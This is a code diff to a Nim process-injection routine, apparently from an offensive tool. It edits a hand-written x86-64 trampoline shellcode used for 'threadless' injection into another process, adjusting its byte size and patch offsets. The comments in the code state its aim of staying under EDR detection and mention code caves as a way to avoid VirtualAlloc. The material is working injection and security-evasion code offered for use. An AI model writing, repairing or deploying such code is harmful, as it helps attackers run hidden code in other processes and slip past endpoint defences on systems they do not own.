@@ -38,7 +38,7 @@ import cfgadd
 
 proc threadlessThread*(processHandle: HANDLE, jumpAddress: LPVOID, exportAddress: LPVOID): bool =
     var 
-        trampolineStk: array[91, byte]
+        trampolineStk: array[89, byte]
         trampSize: DWORD
         highBytePatched: DWORD64
         lowBytePatched: DWORD64
@@ -65,8 +65,7 @@ proc threadlessThread*(processHandle: HANDLE, jumpAddress: LPVOID, exportAddress
     0x55,                                                           # PUSH RBP
     0x48, 0x89, 0xE5,                                               # MOV RBP, RSP
     0x48, 0x83, 0xec, 0x08,                                         # SUB RSP, 0x08                    : always equal to 8%16 to have an aligned stack. It is mandatory for some function call
-    0x50,                                                           # push RAX                         : just save the context registers
-    0x53,                                                           # push RBX
+    0x53,                                                           # push RBX                         : just save the context registers
     0x51,                                                           # push RCX                         
     0x52,                                                           # push RDX
     0x41, 0x50,                                                     # push R8
@@ -92,11 +91,10 @@ proc threadlessThread*(processHandle: HANDLE, jumpAddress: LPVOID, exportAddress
     0x5a,                                                           # pop RDX
     0x59,                                                           # pop RCX
     0x5b,                                                           # pop RBX
-    0x58,                                                           # pop RAX
     0xc9,                                                           # leave
     0xc3                                                            # ret   
     ]
-    trampSize = 91
+    trampSize = 89
 
     highBytePatched = 0
     lowBytePatched = 0
@@ -145,9 +143,9 @@ proc threadlessThread*(processHandle: HANDLE, jumpAddress: LPVOID, exportAddress
 
     # Replace the place holders in the trampoline shellcode
     # with the righ values
-    moveMemory(unsafeAddr trampolineStk[34], &highBytePatched, sizeof(DWORD64))
-    moveMemory(unsafeAddr trampolineStk[44], &lowBytePatched, sizeof(DWORD64))
-    moveMemory(unsafeAddr trampolineStk[61], unsafeAddr jumpAddress, sizeof(DWORD64))
+    moveMemory(unsafeAddr trampolineStk[33], &highBytePatched, sizeof(DWORD64))
+    moveMemory(unsafeAddr trampolineStk[43], &lowBytePatched, sizeof(DWORD64))
+    moveMemory(unsafeAddr trampolineStk[60], unsafeAddr jumpAddress, sizeof(DWORD64))
     # Write the trampoline somewhere in memory
     # Here VirtualAlloc is used, but some code cave can be used to limit this call
     # As the trampoline size is lesser than 4Ko, we should be ok for EDR detections
